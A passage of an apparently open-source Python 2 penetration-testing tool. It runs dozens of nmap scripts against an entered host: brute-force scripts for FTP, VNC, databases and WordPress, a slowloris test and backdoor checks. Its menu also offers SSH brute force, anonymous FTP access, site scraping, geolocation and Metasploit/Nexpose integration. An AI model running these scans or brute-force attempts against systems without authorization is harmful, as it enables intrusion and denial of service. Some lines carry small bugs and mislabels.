                print 'Checking ftp-brute.nse  .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script ftp-brute.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-libopie.nse  .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script ftp-libopie.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-proftpd-backdoor.nse  .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script ftp-proftpd-backdoor.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-vsftpd-backdoor.nse   .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script ftp-vsftpd-backdoor.nse",callback=callbackFTP)
                self.scanning()
            
            #vnc
            if (port==5900) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking VNC port with nmap scripts......'
                #scripts for vnc:5900 open
                print 'Checking vnc-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p5900 --script vnc-brute.nse",callback=callbackVNC)
                self.scanning()
                print 'Checking vnc-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p5900 --script vnc-info.nse",callback=callbackVNC)
                self.scanning()
                
            #postgres
            if (port==5432) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking POSTGRES port with nmap scripts......'
                #scripts for postgres:5432 open
                print 'Checking pgsql-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p5432 --script pgsql-brute.nse",callback=callbackPostgres)
                self.scanning()
                
            #mongodb
            if (port==27017) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking MONGODB port with nmap scripts......'
                #scripts for mondogb:27017 open
                print 'Checking mongodb-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p27017 --script mongodb-brute.nse",callback=callbackMongoDB)
                self.scanning()
                print 'Checking mongodb-databases.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p27017 --script mongodb-databases.nse",callback=callbackMongoDB)
                self.scanning()
                print 'Checking mongodb-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p27017 --script mongodb-info.nse",callback=callbackMongoDB)
                self.scanning()
                
            #cassandra
            if (port==9160) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking CASSANDRA port with nmap scripts......'
                #scripts for cassandra:9160 open
                print 'Checking cassandra-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p9160 --script cassandra-brute.nse",callback=callbackCassandra)
                self.scanning()
                print 'Checking cassandra-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p9160 --script cassandra-info.nse",callback=callbackCassandra)
                self.scanning()
            
            #ssl
            if (port==443) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking SSL port with nmap scripts......'
                #scripts for ssl:443 open
                print 'Checking ssl-cert.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script ssl-cert.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking ssl-date.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script ssl-date.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking ssl-enum-ciphers.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script ssl-enum-ciphers.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking ssl-google-cert-catalog.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script ssl-google-cert-catalog.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking ssl-known-key.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script ssl-known-key.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking sslv2.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script sslv2.nse",callback=callbackSSL)
                self.scanning()
                
            #ssh
            if (port==22) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking SSH port with nmap scripts......'
                #scripts for SSH:22 open
                print 'Checking ssh-hostkey.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p22 --script ssh-hostkey.nse",callback=callbackSSH)
                self.scanning()
                print 'Checking ssh2-enum-algos.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p22 --script ssh2-enum-algos.nse",callback=callbackSSH)
                self.scanning()
                print 'Checking sshv1.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p22 --script sshv1.nse",callback=callbackSSH)
                self.scanning()
                
            #metaexploit
            if (port==55553) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking METAEXPLOIT port with nmap scripts......'
                #scripts for metaexploit:55553 open
                print 'Checking metasploit-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p55553 --script metasploit-info.nse",callback=callbackMetaExploit)
                self.scanning()
                print 'Checking metasploit-msgrpc-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p55553 --script metasploit-msgrpc-brute.nse",callback=callbackMetaExploit)
                self.scanning()
                print 'Checking metasploit-xmlrpc-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p55553 --script metasploit-xmlrpc-brute.nse",callback=callbackMetaExploit)
                self.scanning()
                
            #nessus
            if (port==1241) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking NESSUS port with nmap scripts......'
                #scripts for nessus:1241 open
                print 'Checking netbus-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p1241 --script netbus-brute.nse",callback=callbackNessus)
                self.scanning()
                print 'Checking nessus-xmlrpc-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p1241 --script nessus-xmlrpc-brute.nse",callback=callbackNessus)
                self.scanning()
                
            #http
            if (port==80 or port==8080) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking HTTP port with nmap scripts......'
                #scripts for http:80 open
                print 'Obtain Hosts on IP hostmap-bfk.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script hostmap-bfk.nse",callback=callbackHTTP)
                self.scanning() 
                print 'Checking dns-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script dns-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-adobe-coldfusion-apsa1301.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-adobe-coldfusion-apsa1301.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-affiliate-id.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-affiliate-id.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-apache-negotiation.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-apache-negotiation.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-auth-finder.nse....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-auth-finder.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-auth.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-auth.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-awstatstotals-exec.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-awstatstotals-exec.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-axis2-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-axis2-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-backup-finder.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-backup-finder.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-barracuda-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-barracuda-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-barracuda-dir-traversal.nse....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-cakephp-version.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-cakephp-version.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-chrono.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-chrono.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-coldfusion-subzero.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-coldfusion-subzero.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-comments-displayer.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-comments-displayer.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-config-backup.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-config-backup.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-cors.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-cors.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-date.nse....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-date.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-default-accounts.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-default-accounts.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-domino-enum-passwords.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-domino-enum-passwords.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-drupal-enum-users.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-drupal-enum-users.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-drupal-modules.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-drupal-modules.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-email-harvest.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-email-harvest.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-enum.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-exif-spider.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-exif-spider.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-favicon.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-favicon.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-fileupload-exploiter.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-fileupload-exploiter.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-form-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-form-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-form-fuzzer.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-form-fuzzer.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-frontpage-login.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-frontpage-login.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-generator.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-generator.nse",callback=callbackHTTP)
                self.scanning()
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-git.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-gitweb-projects-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-gitweb-projects-enum.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-google-malware.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-google-malware.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-grep.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-grep.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-headers.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-headers.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-huawei-hg5xx-vuln.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-huawei-hg5xx-vuln.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-icloud-findmyiphone.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-icloud-findmyiphone.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-icloud-sendmsg.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-icloud-sendmsg.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-iis-webdav-vuln.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-iis-webdav-vuln.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-joomla-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-joomla-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-litespeed-sourcecode-download.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-litespeed-sourcecode-download.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-majordomo2-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-majordomo2-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-malware-host.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-malware-host.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-method-tamper.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-method-tamper.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-methods.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-methods.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-open-proxy.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-open-proxy.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-open-redirect.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-open-redirect.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-passwd.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-passwd.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-php-version.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-php-version.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-phpmyadmin-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-phpmyadmin-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking netbus-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-phpself-xss.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-proxy-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-proxy-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-put.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-put.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-qnap-nas-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-qnap-nas-info.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-rfi-spider.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-rfi-spider.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-robots.txt.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-robots.txt.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-robtex-reverse-ip.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-robtex-reverse-ip.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-robtex-shared-ns.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-robtex-shared-ns.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-sitemap-generator.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-sitemap-generator.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-slowloris-check.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-slowloris-check.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-slowloris.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-slowloris.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-sql-injection.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-sql-injection.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking hhttp-stored-xss.nse....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script hhttp-stored-xss.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-title.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-title.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-tplink-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-tplink-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-trace.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-trace.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-traceroute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-traceroute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-unsafe-output-escaping.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-unsafe-output-escaping.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-userdir-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-userdir-enum.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vhosts.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vhosts.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-virustotal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-virustotal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vlcstreamer-ls.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vlcstreamer-ls.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vmware-path-vuln.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vmware-path-vuln.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2009-3960.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vuln-cve2009-3960.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2010-0738.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vuln-cve2010-0738.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2010-2861.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vuln-cve2010-2861.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2011-3192.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vuln-cve2011-3192.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2011-3368.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vuln-cve2011-3368.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2012-1823.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vuln-cve2012-1823.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2013-0156.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-vuln-cve2013-0156.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-waf-detect.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-waf-detect.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-waf-fingerprint.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-waf-fingerprint.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-wordpress-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-wordpress-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-wordpress-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-wordpress-enum.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-wordpress-plugins.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script http-wordpress-plugins.nse",callback=callbackHTTP)
                self.scanning()
 
        # Checking the time again
        t2 = datetime.now()

        # Calculates the difference of time, to see how long it took to run the script
        total =  t2 - t1

        # Printing the information to screen
        print 'Scanning Completed in: ', total

#class for scraping 
class Scraping:
    
    def scrapingBeautifulSoup(self,hostname):
    
        try:
            print("BeautifulSoup..............")
            response = requests.get("http://"+hostname)
            bs = BeautifulSoup(response.text, 'lxml')
            for tagImage in bs.find_all("img"): 
                print(tagImage['src'])
        
        except Exception,e:
                print "Error to connect with " + hostname + " for scraping the site" 
                pass
    
    def scrapingImagesPdf(self,ip):
        print("\nScraping the server for images and pdfs.... "+ ip)
    
        try:
            url = 'http://'+ip
            response = requests.get(url)  
            parsed_body = html.fromstring(response.text)

            # Grab links to all images
            images = parsed_body.xpath('//img/@src')

            # Convert any relative urls to absolute urls
            images = [urlparse.urljoin(response.url, url) for url in images]  
    
            print 'Found %s images' % len(images)
    
            #create directory for save images
            if len(images) >0:
                os.system("mkdir images")
    
    
            for url in images:
                print url
                # download images in img directory
                r = requests.get(url)
                f = open('images/%s' % url.split('/')[-1], 'w+')
                f.write(r.content)
                f.close()
    

            # Grab links to all pdf
            pdfs = parsed_body.xpath('//a[@href[contains(., ".pdf")]]/@href')
    
            #create directory for save pdfs
            if len(pdfs) >0:
                os.system("mkdir pdfs")
        
            # Convert any relative urls to absolute urls
            pdf = [urlparse.urljoin(response.url, url) for url in pdfs]  
            print 'Found %s pdf' % len(pdfs)
            for url in pdfs:
                print url
            # download pdfs in pdf directory
            r = requests.get(url)
            f = open('pdfs/%s' % url.split('/')[-1], 'w')
            f.write(r.content)
            f.close()
    
        except Exception,e:
                print "Error to connect with " + hostname + " for scraping the site" 
                pass
            
        print("\nGet Metatada Image")
        print "------------------------------------"
        imageMetaData = ImageMetaData()
        imageMetaData.printMetaData()
    
        print("\nGet Metatada PDF")
        print "------------------------------------"
        pdfMetaData = PDFMetaData()
        pdfMetaData.printMetaData()

        
            
def geoLocationInfo(hostName,ip):
    print '\nGeoLocation Info'
    print "--------------------------"
    
    try:
        #Informacion geolocalización
        gi = pygeoip.GeoIP('GeoLiteCity.dat')
        pprint.pprint("Country code: %s " %(str(gi.country_code_by_name(hostName))) )
        pprint.pprint("Full record: %s " %(str(gi.record_by_addr(ip))) )
        pprint.pprint("City: %s " %(str(gi.record_by_addr(ip)['city'])) )
        pprint.pprint("Timezone: %s " %(str(gi.record_by_addr(ip)['time_zone'])) )
        pprint.pprint("Country name: %s " %(str(gi.country_name_by_addr(ip))) )
        pprint.pprint("Timezone: %s" %(str(gi.time_zone_by_addr(ip))) )
        pprint.pprint("Continent: %s " %(str(gi.record_by_addr(ip)['continent'])) )
         
        print '\nGeoLocation Latitude'
        print "--------------------------"
        print gi.record_by_addr(ip)['latitude']
    
        print '\nGeoLocation Longitude'
        print "--------------------------"
        print gi.record_by_addr(ip)['longitude']
    
        latitude = gi.record_by_addr(ip)['latitude']
        longitude = gi.record_by_addr(ip)['longitude']
    
        print '\nAddress'
        print "--------------------------"
    
        results = Geocoder.reverse_geocode(latitude, longitude)
        pprint.pprint(results.formatted_address)
    
    except Exception,e:
        print "Error obtaining geolocation.GeoLiteCity.dat not found"
        pass
    
def showMenu():
    print "\n(0)-->EXIT"
    print "(1)-->Check Open Ports"
    print "(2)-->Check Option methods"
    print "(3)-->Check DNS Servers info"
    print "(4)-->Check Host info fron Shodan Service"
    print "(5)-->NMAP Scanning"
    print "(6)-->Host Info by Socket Call"
    print "(7)-->GeoLocation Host Info"
    print "(8)-->Scraping for images and pdf & obtain metadata"
    print "(9)-->Get Headers info"
    print "(10)-->Get SSH user/password Brute Force"
    print "(11)-->Get FTP Anonymous access"
    print "(12)-->MetaSploitFrameWork"
    print "(13)-->NexposeFramework"
    option = raw_input ("Choose an option:")
    return option
    
if __name__ == "__main__":

    shodanSearch = ShodanSearch()
    dnsResolver = dnsResolver()
    sshConnection = SSHConnection()
    checker = Checker()
    scraping = Scraping()
    scanningNMAP = ScanningNMAP()

    portlist = [21,22,80,8080,443,5432,3306,27017,55553,1241,9160,389,5900]
    ip = ""
    hostname = ""
    option = ""

    ip_server_metasploit = ""
    port_server_metasploit = ""
    user_metasploit = ""
    password_metasploit = ""

    pyconnect = 0
    
    while (hostname ==""):
        hostname = raw_input ("Introduce IP or name domain:")
    
    
    print("\nObtain Ip address from host name")
    print "-----------------------------------"
    ip = socket.gethostbyname(hostname)
    print 'The IP address of ', hostname, 'is', ip
    
    
    while option != 0:
        option = showMenu()
        if option == "0":
           sys.exit(1);
        if option == "1":
            f = open('logOpenPorts.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            checker.checkOpenPorts(ip,portlist)
        if option == "2":
            f = open('logOptionMethods.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            checker.checkOptionMethods(hostname)
        if option == "3":
            f = open('logDnsInfo.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            dnsResolver.checkDNSInfo(ip,hostname)
        if option == "4":
            f = open('logHostInfo.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            shodanSearch.obtain_host_info(ip)
        if option == "5":
            f = open('logNScanningNmap.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            scanningNMAP.scanNMAP(ip,portlist)
            if platform.system() == "Linux":
                scanningNMAP.scanningNmapUnix(ip)
            if platform.system() == "Windows":
                scanningNMAP.scanningNmapWindows(ip)
        if option == "6":
            f = open('logHostByName.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            print socket.gethostbyname(hostname)
        if option == "7":
            f = open('logGeoLocationInfo.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            geoLocationInfo(hostname,ip)
        if option == "8":
            f = open('logScraping.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            scraping.scrapingImagesPdf(hostname)
            scraping.scrapingImagesPdf(ip)
            scraping.scrapingBeautifulSoup(hostname)
        if option == "9":
            f = open('logCheckHeaders.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            checker.checkHeadersInfoByIp(ip)
            checker.checkHeadersInfoByHostName(hostname)
        if option == "10":
            f = open('logSSHBruteForce.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            sshConnection.SSHBruteForce(hostname)
        if option == "11":
            f = open('logFTP.txt', 'a')
            sys.stdout = Log(sys.stdout, f)
            ftpConnection = FTPConnection(hostname)
            ftpConnection.ftpConnectionAnonymous()
        if option == "12":

            while (ip_server_metasploit == ""):
                ip_server_metasploit = raw_input ("Introduce IP server where MetaSploit is running:")
            while (port_server_metasploit == ""):
                port_server_metasploit = raw_input ("Introduce Port server where MetaSploit is running:")
            while (user_metasploit == ""):
                user_metasploit = raw_input ("Introduce user for MetaSploit:")
            while (password_metasploit == ""):
                password_metasploit = getpass.getpass ("Introduce password for MetaSploit:")
                
            try:
                f = open('metaSploit_log.txt', 'w')
                sys.stdout = Log(sys.stdout, f)
            
                metaSploitFrameWork = MetaSploitFrameWork(port_server_metasploit,ip_server_metasploit,ip,user_metasploit,password_metasploit)
                metaSploitFrameWork.scanMetaSploitFrameWork()
                
            except Exception,e:
                print "Error to connecting with MetaSploit Server"
                print e
                pass

        if option == "13":
            if pyconnect == 0:
                serveraddr_nexpose = ""
                port_server_nexpose = ""
                user_nexpose = ""
                password_nexpose = ""
                while (serveraddr_nexpose == ""):
                    serveraddr_nexpose = raw_input ("Introduce IP server where Nexpose is running:")
                while (port_server_nexpose == ""):
                    port_server_nexpose = raw_input ("Introduce Port server where Nexpose is running:")
                while (user_nexpose == ""):
                    user_nexpose = raw_input ("Introduce user for Nexpose:")
                while (password_nexpose == ""):
                    password_nexpose = getpass.getpass ("Introduce password for Nexpose:")
                

            try:
                if pyconnect == 0: 
                    pynexposeHttps = pynexposeHttps.NeXposeServer(serveraddr_nexpose, port_server_nexpose, user_nexpose, password_nexpose)
                    pyconnect = 1                
            except Exception,e:
                pyconnect = 0 
                print "Error to connecting with NeXposeServer"
                print e
                pass
            
            try:
                f = open('nexpose_log.txt', 'w')
                sys.stdout = Log(sys.stdout, f)
                nexposeFrameWork = NexposeFrameWork(pynexposeHttps)
                nexposeFrameWork.siteListing()
                nexposeFrameWork.vulnerabilityListing()
                
                pynexposeHttps.logout()
                
            except Exception,e:
                print "Error to connecting with NeXposeServer for listing vulnerabilities"
                print e
                pass
            
